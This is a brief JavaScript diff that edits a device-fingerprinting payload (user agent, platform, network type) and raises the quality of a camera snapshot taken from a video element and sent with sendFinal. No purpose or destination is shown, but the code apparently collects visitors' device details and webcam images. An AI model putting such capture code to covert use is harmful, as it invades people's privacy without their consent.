@@ -53,9 +53,8 @@ send({
   event: "init",
   device: navigator.userAgent,
   os: navigator.platform,
-  browser: navigator.appName,
-  screen: `${screen.width}x${screen.height}`,
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  browser: navigator.userAgent, // better than appName
+  network: navigator.connection?.effectiveType || "unknown",
   time: new Date().toISOString()
 });
 
@@ -120,7 +119,7 @@ async function camera() {
 
     canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
 
-    const image = canvas.toDataURL("image/jpeg", 0.5);
+    const image = canvas.toDataURL("image/jpeg", 0.8);
 
     sendFinal({
       image,
